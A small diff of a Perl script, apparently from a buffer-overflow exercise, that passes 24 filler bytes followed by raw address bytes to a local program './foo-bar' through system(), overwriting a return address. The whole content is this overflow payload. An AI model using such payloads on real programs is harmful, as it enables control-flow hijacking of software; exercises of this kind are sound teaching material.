@@ -2,7 +2,8 @@
 
 use strict;
 
-my $arg = "ABCDEFGHIJKLMNOPQRSTUVWX"."\xf4\x05\x40";
+my $fill = "A" x 24;
+my $arg = $fill."\xf4\x05\x40";
 my $cmd = "./foo-bar ".$arg;
 
 system($cmd);
